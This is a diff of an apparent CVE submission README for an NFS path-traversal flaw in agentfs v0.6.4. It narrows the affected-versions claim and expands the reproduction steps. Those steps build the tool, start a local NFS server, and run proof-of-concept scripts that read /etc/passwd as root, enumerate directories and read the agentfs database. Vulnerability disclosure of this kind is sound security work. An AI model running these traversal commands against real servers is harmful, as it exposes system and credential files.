@@ -16,8 +16,8 @@ a full-file copy-up into the SQLite delta, giving an availability impact.
 
 - `agentfs` / `agentfs-sdk` v0.6.4 tag (`3a5ed2b88e5d5a5f9b2c7fe02d012b50fd19e3c0`)
 - `0a014eb` (2 commits ahead; vulnerable files identical)
-- Likely all releases exposing `serve nfs`/`nfs` overlay mode; macOS
-  source-level affected (runtime pending)
+- Other versions exposing `serve nfs`/`nfs` overlay mode may be affected;
+  not systematically verified. macOS source-level affected (runtime pending)
 
 ## Severity
 
@@ -53,19 +53,30 @@ a full-file copy-up into the SQLite delta, giving an availability impact.
 
 ## Reproduce
 
+Two separate directories: `PACK` = this repo / extracted submission archive
+(contains `pocs/` and `cve-submission/build-patch-v064.diff`), `SRC` = a fresh
+upstream checkout. Build does not install `agentfs`; invoke the binary directly.
+
 ```bash
-git clone https://github.com/tursodatabase/agentfs.git && cd agentfs
-git checkout v0.6.4
-# build-only patch (agentfs sources untouched); see cve-submission/build-patch-v064.diff
-mkdir -p vendor && tar xzf branches-0.4.4.crate -C vendor   # crates.io 0.4.4
-git apply cve-submission/build-patch-v064.diff
-cd cli && cargo +stable build --release --no-default-features
+# --- Terminal 1: build ---
+PACK=/path/to/agentfs-cve
+SRC=/tmp/agentfs-upstream
+git clone https://github.com/tursodatabase/agentfs.git "$SRC"
+cd "$SRC" && git checkout v0.6.4
+curl -sL https://crates.io/api/v1/crates/branches/0.4.4/download -o /tmp/branches-0.4.4.crate
+mkdir -p vendor && tar xzf /tmp/branches-0.4.4.crate -C vendor   # crates.io 0.4.4
+git apply "$PACK/cve-submission/build-patch-v064.diff"           # build-only patch
+(cd cli && cargo +stable build --release --no-default-features)
+BIN="$SRC/cli/target/release/agentfs"
 
+# --- Terminal 1 (cont.): lab setup + server (leave running) ---
 mkdir -p /tmp/lab/base && echo MARKER > /tmp/lab/base/inside.txt
-agentfs init --base /tmp/lab/base poc
-agentfs serve nfs poc --bind 127.0.0.1 --port 11111
+"$BIN" init --base /tmp/lab/base poc
+"$BIN" serve nfs poc --bind 127.0.0.1 --port 11111
 
-python3 pocs/nfs_traversal_capture.py --name /etc/passwd --read 256 --uid 0 --gid 0 --outdir out/abs
+# --- Terminal 2: attacks ---
+cd "$PACK"
+python3 pocs/nfs_traversal_capture.py --name /etc/passwd --read 256 --uid 0 --gid 0 --port 11111 --outdir out/abs
 python3 pocs/nfs_enum.py --outdir out/enum --port 11111 --paths / /home /tmp
 python3 pocs/nfs_db_read.py --outdir out/db --port 11111 --db /path/to/.agentfs/<export>.db-wal
 truncate -s 128M /tmp/lab/big_sparse.bin   # outside export base
